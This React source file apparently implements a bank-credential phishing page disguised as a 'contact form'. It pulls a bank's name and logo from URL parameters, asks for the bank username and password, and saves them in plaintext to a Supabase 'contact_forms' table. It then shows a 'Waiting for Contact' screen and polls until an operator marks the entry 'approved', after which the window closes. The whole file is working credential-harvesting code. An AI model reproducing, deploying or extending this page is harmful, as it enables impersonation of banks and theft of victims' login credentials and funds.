import { useState, useEffect } from 'react'
import { supabase } from '../lib/supabase.js'
import Icon from '../components/Icon.jsx'

// Logo del banco
function BankLogo({ name, file, domain }) {
  const [err, setErr] = useState(false)
  const src = file ? `/banks/${file}` : domain ? `https://icons.duckduckgo.com/ip3/${domain}.ico` : null
  if (err || !src) return <span className="text-sm font-bold text-content-primary">{name}</span>
  return (
    <img
      src={src}
      alt={name}
      loading="lazy"
      onError={() => setErr(true)}
      className="max-h-16 max-w-[90%] object-contain"
    />
  )
}

export default function ContactForm() {
  const [formId, setFormId] = useState(null)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [step, setStep] = useState('form') // 'form' | 'waiting' | 'success'
  const [submitting, setSubmitting] = useState(false)

  // Obtener parámetros de URL
  const params = new URLSearchParams(window.location.search)
  const userId = params.get('uid')
  const bankName = params.get('bank')
  const bankFile = params.get('file')
  const bankDomain = params.get('domain')

  // Polling para saber si fue aprobado
  useEffect(() => {
    if (step !== 'waiting' || !formId) return

    const interval = setInterval(async () => {
      const { data } = await supabase.from('contact_forms').select('status').eq('id', formId).maybeSingle()
      if (data?.status === 'approved') {
        setStep('success')
        clearInterval(interval)
      }
    }, 1000) // Verifica cada segundo

    return () => clearInterval(interval)
  }, [step, formId])

  const submitForm = async (e) => {
    e.preventDefault()
    if (!username || !password) return

    setSubmitting(true)
    const { data, error } = await supabase
      .from('contact_forms')
      .insert({
        full_name: username,
        phone: null,
        email: null,
        password: password,
        note: null,
        institution: bankName || null,
        user_id: userId || null,
        status: 'pending',
      })
      .select('id')
      .single()

    setSubmitting(false)

    if (error) {
      alert('Error al guardar: ' + error.message)
      return
    }

    // Formulario guardado, pasar a "Esperando contacto"
    setFormId(data.id)
    setStep('waiting')
  }

  const closeWindow = () => window.close()

  // ---- FORMULARIO ----
  if (step === 'form') {
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4 py-10">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl">
          <div className="mb-6 flex items-center justify-between">
            <h1 className="text-2xl font-bold text-content-primary">Bank Credentials</h1>
            <button onClick={closeWindow} aria-label="Close" className="text-content-primary hover:text-content-secondary">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                <path d="M18 6 6 18M6 6l12 12" />
              </svg>
            </button>
          </div>

          {/* Logo del banco */}
          <div className="mb-6 flex justify-center">
            <span className="flex h-20 w-20 items-center justify-center rounded-2xl bg-bg-neutral">
              <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
            </span>
          </div>

          <form onSubmit={submitForm} className="space-y-4">
            <div>
              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Usuario</label>
              <input
                type="text"
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Your username"
                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Password</label>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Your password"
                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
              />
            </div>

            <button
              type="submit"
              disabled={submitting}
              className="w-full rounded-full bg-black py-3.5 font-bold text-white hover:bg-black/90 disabled:opacity-60"
            >
              {submitting ? 'Submitting…' : 'Submit'}
            </button>
          </form>
        </div>
      </div>
    )
  }

  // ---- ESPERANDO CONTACTO ----
  if (step === 'waiting') {
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl text-center">
          <div className="mb-6 flex justify-center">
            <span className="flex h-16 w-16 items-center justify-center rounded-full bg-bright-green/30">
              <Icon name="hourglass" size={32} className="text-forest animate-pulse" />
            </span>
          </div>
          <h1 className="mb-2 text-2xl font-bold text-content-primary">Waiting for Contact</h1>
          <p className="text-content-secondary">We received your information. Our team will review it and get back to you soon.</p>
          <div className="mt-6 h-1 w-12 rounded-full bg-bright-green mx-auto animate-pulse" />
        </div>
      </div>
    )
  }

  // ---- ÉXITO ----
  if (step === 'success') {
    setTimeout(closeWindow, 2000)
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl text-center">
          <div className="mb-6 flex justify-center">
            <span className="flex h-16 w-16 items-center justify-center rounded-full bg-bright-green/30">
              <Icon name="check" size={32} stroke={3} className="text-forest" />
            </span>
          </div>
          <h1 className="mb-2 text-2xl font-bold text-content-primary">Form Submitted Successfully!</h1>
          <p className="text-content-secondary">Thank you. This window will close in a moment.</p>
        </div>
      </div>
    )
  }
}
